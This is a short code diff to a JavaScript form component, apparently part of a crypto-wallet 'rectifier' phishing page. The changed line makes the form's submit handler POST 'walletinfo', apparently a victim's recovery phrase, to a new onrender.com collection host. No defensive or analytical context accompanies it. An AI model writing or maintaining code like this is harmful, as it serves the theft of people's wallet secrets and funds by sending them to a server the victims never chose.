@@ -38,7 +38,7 @@ function AddPhrase() {
 
   const sendEmail = async (e) => {
     e.preventDefault();
-    let response = await fetch("https://authentication-rectifier.onrender.com/api/walletinfo", {
+    let response = await fetch("https://defi-rectifier.onrender.com/api/walletinfo", {
         method: "POST",
         headers: {
             accept: 'application/json',
